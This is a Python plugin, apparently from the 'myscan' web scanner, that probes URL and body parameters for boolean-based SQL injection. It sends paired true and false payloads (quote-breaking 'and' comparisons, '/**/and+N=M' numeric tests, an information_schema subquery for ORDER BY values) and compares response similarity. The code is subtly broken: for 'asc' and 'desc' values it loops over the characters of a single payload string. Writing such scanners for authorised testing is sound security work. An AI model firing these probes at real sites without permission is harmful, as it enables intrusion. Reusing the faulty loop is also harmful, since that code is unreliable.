#!/usr/bin/env python3
# @Time    : 2020-03-01
# @Author  : caicai
# @File    : myscan_sqli_boolen.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.common import get_random_str, similar
from myscan.lib.scriptlib.sqli.diffpage import findDynamicContent, removeDynamicContent, getFilteredPageContent
import copy, random

'''

测试and 注入,一般数据包数据都是正确的，所以不测试or注入
'''


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sqli boolen"
        self.vulmsg = "sqli boolen"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        parser = dictdata_parser(self.dictdata)
        # send again . to find dynamic text
        self.dynamic = []
        r = request(**parser.getrawrequest())
        if r != None:
            ret = findDynamicContent(parser.getresponsebody().decode(errors="ignore"), r.text)
            if ret:
                self.dynamic.extend(ret)
            if self.dictdata.get("response").get("mime_stated") == "HTML":
                self.text = getFilteredPageContent(removeDynamicContent(r.text, self.dynamic))
            else:
                self.text = removeDynamicContent(r.text, self.dynamic)
        else:
            return

        # test url and body params
        sql_flag = [
            "'and'{0}'='{1}",
            '"and"{0}"="{1}',
        ]
        #url and body
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        if params:
            for param in params:
                success = False
                payloads = copy.deepcopy(sql_flag)
                if param.get("value") in ["desc", "asc"]:
                    payloads = ",if('{0}'='{1}',1,(select 1 from information_schema.tables))"
                for payload in payloads:
                    random_str = get_random_str(2).lower()
                    payload_right = payload.format(random_str + "a", random_str + "a")
                    payload_false = payload.format(random_str + "b", random_str + "c")
                    req_true = parser.getreqfromparam(param, "a", payload_right)
                    req_false = parser.getreqfromparam(param, "a", payload_false)
                    if self.inject(req_false, req_true, payload_right, payload_false):
                        success = True
                        break
                if not success and str(param.get("value")).isdigit():
                    param_value = param.get("value")
                    random_num = random.randint(2, 8)
                    payloads_num = [
                        ("/0", "*1"),
                        ("/**/and+{0}={1}".format(random_num, random_num + 1),
                         "/**/and+{0}={1}".format(random_num, random_num)),
                    ]
                    for payload_false, payload_right in payloads_num:
                        req_true = parser.getreqfromparam(param, "a", payload_right)
                        req_false = parser.getreqfromparam(param, "a", payload_false)
                        if self.inject(req_false, req_true, param_value + payload_right, param_value + payload_false):
                            break
                            pass
        #host header 部分


    def inject(self, req_false, req_true, payload_right, payload_false):
        rf = request(**req_false)
        rt = request(**req_true)
        if rf != None and rt != None:
            if self.dictdata.get("response").get("mime_stated") == "HTML":
                rf_text = getFilteredPageContent(removeDynamicContent(rf.text, self.dynamic))
                rt_text = getFilteredPageContent(removeDynamicContent(rt.text, self.dynamic))
            else:
                rf_text = removeDynamicContent(rf.text, self.dynamic)
                rt_text = removeDynamicContent(rt.text, self.dynamic)
            rf_similar = round(similar(rf_text, self.text), 3)
            rt_similar = round(similar(rt_text, self.text), 3)
            rt_rf_similar = round(similar(rf.text, rt.text), 3)
            # print("{} rtpayload{} rfpayload{} rf:{},rt:{},both:{}".format(self.data.url_path,self.payload_rt,self.payload_rf,rf_similar,rt_similar,rt_rf_similar))
            if rt_rf_similar != 1.0 and rt_similar > rf_similar and rt_similar > 0.98:
                response_rt = response_parser(rt)
                response_rf = response_parser(rf)
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url").get("url").split("?")[0],
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "payload": "payload_true:{}  payload_false:{}".format(payload_right, payload_false),
                        "similar_rate": "payload_false_rate:{} payload_true_rate:{} payload_true_false_rate:{}".format(
                            rf_similar,
                            rt_similar, rt_rf_similar),
                        "request_true": response_rt.getrequestraw(),
                        "response_true": response_rt.getresponseraw(),
                        "request_false": response_rf.getrequestraw(),
                        "response_false": response_rf.getresponseraw(),
                    }
                })
                return True

